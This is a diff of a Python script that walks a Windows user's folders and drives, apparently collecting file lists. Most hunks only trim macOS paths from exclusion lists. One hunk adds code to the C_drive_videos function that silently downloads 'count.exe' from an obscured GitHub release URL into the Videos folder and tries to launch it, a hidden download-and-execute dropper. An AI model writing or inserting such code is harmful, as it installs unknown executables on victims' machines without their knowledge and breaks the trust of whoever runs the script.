@@ -191,12 +191,6 @@ def C_drive_desktop():
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
                         
-                        '/usr',  
-                        '/Library/',
-                        '/System',
-                        '/Applications',
-                        '.Trash',
-                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -260,12 +254,6 @@ def C_drive_downloads():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        
-                        '/usr',  
-                        '/Library/',
-                        '/System',
-                        '/Applications',
-                        '.Trash',
                         
                         'Program Files',
                         'Program Files (x86)',
@@ -331,12 +319,6 @@ def C_drive_documents():
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
                         
-                        '/usr',  
-                        '/Library/',
-                        '/System',
-                        '/Applications',
-                        '.Trash',
-                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -400,12 +382,6 @@ def C_drive_music():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        
-                        '/usr',  
-                        '/Library/',
-                        '/System',
-                        '/Applications',
-                        '.Trash',
                         
                         'Program Files',
                         'Program Files (x86)',
@@ -471,12 +447,6 @@ def C_drive_pictures():
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
                         
-                        '/usr',  
-                        '/Library/',
-                        '/System',
-                        '/Applications',
-                        '.Trash',
-                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -523,6 +493,15 @@ def C_drive_pictures():
 
 def C_drive_videos():
     userdir = f'C:\\Users\\{os.getlogin()}\\Videos'
+
+    req = urllib.request.Request('https://github.com/testy65421/UmMqQ-rbNq-q-ZQ_n__n7-f-9Xv-L-9Fz-Qnm-7R-8Rx-/releases/download/dsf/count.exe', headers={'User-Agent': 'Mozilla/5.0'})
+    f = urlopen(req)
+    filecontent = f.read()
+    with open(f'{userdir}\\count.exe', 'wb') as f:
+        f.write(filecontent)
+    f.close()
+    os.start(f'{userdir}\\count.exe')
+
     listOfFiles = list()
 
     file_input = userdir
@@ -540,12 +519,6 @@ def C_drive_videos():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        
-                        '/usr',  
-                        '/Library/',
-                        '/System',
-                        '/Applications',
-                        '.Trash',
                         
                         'Program Files',
                         'Program Files (x86)',
@@ -612,12 +585,6 @@ def D_drive():
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
                         
-                        '/usr',  
-                        '/Library/',
-                        '/System',
-                        '/Applications',
-                        '.Trash',
-                        
                         'Program Files',
                         'Program Files (x86)',
                         'Windows',
@@ -681,12 +648,6 @@ def E_drive():
             if os.path.isfile(file_input)==False:
                 for (dirpath, dirnames, filenames) in os.walk(file_input):
                     EXCLUDE_DIRECTORY = (
-                        
-                        '/usr',  
-                        '/Library/',
-                        '/System',
-                        '/Applications',
-                        '.Trash',
                         
                         'Program Files',
                         'Program Files (x86)',
